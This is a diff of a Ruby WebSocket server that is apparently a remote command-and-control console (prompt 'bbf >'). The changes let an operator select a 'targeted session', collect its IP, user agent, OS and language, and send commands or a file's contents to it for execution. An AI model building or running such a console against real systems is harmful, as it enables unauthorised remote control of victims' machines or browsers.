@@ -31,16 +31,15 @@
 require 'em-websocket'
 require 'yaml'
 
-# TODO: Make all the variables besides $wsList non global.
 $wsList = Array.new
 $selected = -1
 COMMANDS = {
     "help" => "Help menu",
     "exit" => "Quit the application",
     "sessions" => "List active sessions",
-    "use" => "Select active session",
-    "info" => "Get session information (IP, User Agent)",
-    "exec" => "Execute a command on a session",
+    "use" => "Select targeted session",
+    "info" => "Get session information (IP, User Agent, Operating System, Language)",
+    "exec" => "Execute commands on the targeted session interactively. Provide an argument to execute a file's contents.",
     "get_cert" => "Get a free TLS certificate from LetsEncrypt",
     "load" => "Load a module (not implemented yet)"
 }
@@ -57,13 +56,13 @@ def main()
     begin
         configfile = YAML.load_file("config.yml")
         Thread.new{startEM(configfile['host'], configfile['port'], configfile['secure'], configfile['priv_key'], configfile['cert_chain'])}
+        cmdLine(configfile['host'], configfile['port'], configfile['secure'])
     rescue => e
         puts 'Error loading configuration'
         puts e.message
         puts e.backtrace
         return
     end
-    cmdLine()
 end
 
 def print_error(message)
@@ -119,11 +118,14 @@ def execCommand(cmdIn)
     if cmdIn.length < 2
         execCommandLoop()
     else
-        # TODO: Support space
         begin
-            sendCommand(cmdIn[1], $wsList[$selected])
-        rescue
+            file = File.open(cmdIn[1], "r")
+            cmdSend = file.read
+            file.close
+            sendCommand(cmdSend, $wsList[$selected])
+        rescue => e
             print_error("Error sending command. Selected session may no longer exist.")
+            puts e.message
         end
     end
 end
@@ -147,12 +149,14 @@ def printHelp()
         print key
         print " --> "
         puts array
+        puts
     end
 end
 
-def cmdLine()
+def cmdLine(host, port, secure)
     puts WELCOME_MESSAGE
-    puts "\nWebSocket listener is now running...\nEnter help for help."
+    puts "\nServer is listening on #{host.to_s}:#{port.to_s}" + ((secure == true) ? " securely" : "") + "..."
+    puts "Enter help for help."
     loop do
         print "\nbbf > "
         cmdIn = gets.chomp.split()
@@ -183,6 +187,8 @@ def cmdLine()
            else
                print_error("getCert.sh does not exist")
            end
+       when nil
+           next
        else
            print_error("Invalid command. Try help for help.")
         end
